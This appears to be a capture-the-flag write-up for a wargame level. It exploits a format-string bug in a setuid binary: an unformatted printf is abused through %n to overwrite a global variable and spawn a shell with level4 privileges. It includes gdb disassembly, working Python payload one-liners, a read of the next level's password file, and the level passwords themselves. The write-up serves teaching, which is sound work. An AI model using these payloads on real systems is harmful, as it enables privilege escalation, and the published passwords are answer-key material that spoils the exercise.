# Level3 - Format string vulnerability - Basic write short integer

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| level3 | `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02` |
| level4 | `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

1. Connect to `level3` user

```shell
ssh level3@$SNOW_HOST -p 4242
# Enter the password

ls -l
> -rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
```

Notice there is a binary with level3 setuid and setgid.

2. Debug level3

Execute level3

```shell
./level3
(stdin) abcdef
> abcdef
```

Seems to be like level2.

Lets debug the binary

```shell
(gdb) info functions

> (...)
  0x080484a4  v
  0x0804851a  main
  (...)
```

```shell
gdb-peda$ pdisas main
  0x0804851a <+0>:     push   ebp
  0x0804851b <+1>:     mov    ebp,esp
  0x0804851d <+3>:     and    esp,0xfffffff0
  0x08048520 <+6>:     call   0x80484a4 <v>                     # call v()
  0x08048525 <+11>:    leave
  0x08048526 <+12>:    ret

gdb-peda$ pdisas v
  0x080484a4 <+0>:     push   ebp
  0x080484a5 <+1>:     mov    ebp,esp
  0x080484a7 <+3>:     sub    esp,0x218
  0x080484ad <+9>:     mov    eax,ds:0x8049860                  # 0x8049860 <stdin@@GLIBC_2.0>
  0x080484b2 <+14>:    mov    DWORD PTR [esp+0x8],eax           # buffer starts at esp+0x8
  0x080484b6 <+18>:    mov    DWORD PTR [esp+0x4],0x200         # fgets maxLength = 0x200 (512)
  0x080484be <+26>:    lea    eax,[ebp-0x208]
  0x080484c4 <+32>:    mov    DWORD PTR [esp],eax
  0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>             # call fgets(buf, 0x200, stdin)
  0x080484cc <+40>:    lea    eax,[ebp-0x208]
  0x080484d2 <+46>:    mov    DWORD PTR [esp],eax
  0x080484d5 <+49>:    call   0x8048390 <printf@plt>            # call printf(buf)
  0x080484da <+54>:    mov    eax,ds:0x804988c
  0x080484df <+59>:    cmp    eax,0x40                          # if $eax == 0x40 (64) ?
  0x080484e2 <+62>:    jne    0x8048518 <v+116>                 # if != jump leave
  0x080484e4 <+64>:    mov    eax,ds:0x8049880                  # 0x8049880 <stdout@@GLIBC_2.0>
  0x080484e9 <+69>:    mov    edx,eax
  0x080484eb <+71>:    mov    eax,0x8048600                     # 0x8048600:       "Wait what?!\n"
  0x080484f0 <+76>:    mov    DWORD PTR [esp+0xc],edx
  0x080484f4 <+80>:    mov    DWORD PTR [esp+0x8],0xc           # nmemb=12
  0x080484fc <+88>:    mov    DWORD PTR [esp+0x4],0x1           # size=1
  0x08048504 <+96>:    mov    DWORD PTR [esp],eax
  0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>            # call fwrite("Wait what?!\n", 1, 12, stdout)
  0x0804850c <+104>:   mov    DWORD PTR [esp],0x804860d         # 0x804860d:       "/bin/sh"
  0x08048513 <+111>:   call   0x80483c0 <system@plt>            # call system("/bin/sh")
  0x08048518 <+116>:   leave
  0x08048519 <+117>:   ret
```

We can see, there is a function `fgets`. In the previous level, `gets` function was the vulnerability. As `fgets` is protected with a `size` parameter to control the number of chars readed, the function is safe.

Then there is an unsafe `printf` syscall. Unsafe because the argument `buf` is directly passed without any format string.

Using printf specifiers we can use this buffer to read and write the stack. This vulnerability is called "Format string attack".

```bash
~/level3 <<< %p
0x200 # print first content after printf argument

~/level3 <<< "%08x.%08x.%08x\n"
> 00000200.b7fd1ac0.b7ff37d0\n # print 3 addresses after printf argument

gdb-peda$ b printf
gdb-peda$ run <<< AAAA
[------------------------------------stack-------------------------------------]
0000| 0xbffff42c --> 0x80484da (<v+54>: mov    eax,ds:0x804988c)
0004| 0xbffff430 --> 0xbffff440 ("AAAA\n")
0008| 0xbffff434 --> 0x200
0012| 0xbffff438 --> 0xb7fd1ac0 --> 0xfbad2288
0016| 0xbffff43c --> 0xb7ff37d0 (<__libc_memalign+16>:  add    ebx,0xb824)
0020| 0xbffff440 ("AAAA\n")
0024| 0xbffff444 --> 0xb7e2000a
0028| 0xbffff448 --> 0x1
[------------------------------------------------------------------------------]
```

We can see an offset of 4 between the printf argument (`0xbffff430`) and the real address of the buffer (`0xbffff440`).

```bash
/level3 <<< 'AAAA.%4$p'
AAAA.0x41414141
```

The specifier `%4$p` prints the 4th address before the printf argument, which contains our buffer string

But the goal is to replace the value of the global variable `m` with 0x40 (64).

To do that, we will use the specifier `%n`. According to the printf() man page, here is what %n should do :

> The number of characters written so far is stored into the integer indicated by the int \* (or variant) pointer argument. No argument is converted.

Basically, it means that `%n` will write the size of our input at the address pointed by `%n`. For example, the following input : `AAAA%n`, means that we will write the value 4 (because the size of "AAAA" equals 4) at the address pointed by `%n`.

The address of the global `m` is `0x0804988c` in big endian.

We have to have a format string like: `<ADDRESS_TO_WRITE_ON> + <PADDING> + "%n"`

```
=> `"\x8c\x98\x04\x08" + "A" * (64 - 4) + "%4$n"`
            |             |                |________ %n specifier with offset of 4
            |             |_________________________ padding of size 60 to write the value 64
            |_______________________________________ m address
```

Lets try

```shell
gdb-peda$ b*v+54
gdb-peda$ run < <(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"')

[------------------------------------stack-------------------------------------]
0000| 0xbffff430 --> 0xbffff440 --> 0x804988c --> 0x40 ('@')
0004| 0xbffff434 --> 0x200
0008| 0xbffff438 --> 0xb7fd1ac0 --> 0xfbad2088
0012| 0xbffff43c --> 0xb7ff37d0 (<__libc_memalign+16>:  add    ebx,0xb824)
0016| 0xbffff440 --> 0x804988c --> 0x40 ('@')
[------------------------------------------------------------------------------]

gdb-peda$ continue
> Wait what?!
  [New process 5560]
  process 5560 is executing new program: /bin/dash
```

Great! `0xbffff440` has now the value 0x40, and the terminal has been created

We don't have the level4 rights with gdb. Lets try directly with the binary to access the shell:

```bash
(echo `python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"'` ; cat) | ~/level3
> Wait what?!

$ id
> uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)

$ cat /home/user/level4/.pass
> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

## Sources

### Format string vulnerability

- [Memory segmentation - Cheat sheet](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)

- [gets vs fgets](https://iq.opengenus.org/gets-vs-fgets-in-c/#:~:text=depends%20on%20system-,gets()%20keeps%20reading%20input%20until%20newline%20character%20or%20end,of%20input%20characters%20is%20reached.)

- [Format string attack - Introduction](https://owasp.org/www-community/attacks/Format_string_attack)
- [Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings/)
- [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)

### Shell

- [Man fgets](https://linux.die.net/man/3/fgets)
- [Man printf](https://linux.die.net/man/3/printf)
- [Man fwrite](https://linux.die.net/man/3/fwrite)
- [Man system](https://linux.die.net/man/3/system)
